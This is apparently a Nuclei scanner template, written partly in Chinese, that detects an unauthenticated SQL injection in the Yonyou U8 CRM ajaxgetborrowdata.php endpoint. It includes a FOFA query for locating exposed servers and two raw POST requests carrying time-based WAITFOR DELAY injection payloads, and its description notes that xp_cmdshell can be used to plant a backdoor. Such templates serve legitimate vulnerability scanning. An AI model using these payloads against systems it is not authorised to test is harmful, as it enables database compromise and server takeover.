id: yongyouU8-CRM-ajaxgetborrowdata_php-sql-time-2

info:
  name: "用友 U8 CRM ajaxgetborrowdata.php 接口 SQL 注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: title="用友U8CRM"
      用友U8 CRM客户关系管理系统中的/borrowout/ajaxgetborrowdata.php接口存在SQL注入漏洞。攻击者无需身份验证即可利用该漏洞执行任意SQL语句，通过调用xp_cmdshell扩展存储过程写入后门文件，并进一步执行任意代码，最终实现对服务器的控制。
  reference:
  - https://mp.weixin.qq.com/s/fm4V-dgdJ2lweABilr8yLA?token=974751616&lang=zh_CN
  tags: 用友


http:
- raw:
  - |
    POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getCusInfo HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    Cookie: PHPSESSID=bgsesstimeout-;
    Content-Type: application/x-www-form-urlencoded; charset=utf-8

    cus=1%27%3BWAITFOR+DELAY+%270%3A0%3A4%27--
  - |
    POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getCusInfo HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    Cookie: PHPSESSID=bgsesstimeout-;
    Content-Type: application/x-www-form-urlencoded; charset=utf-8

    cus=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27--
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
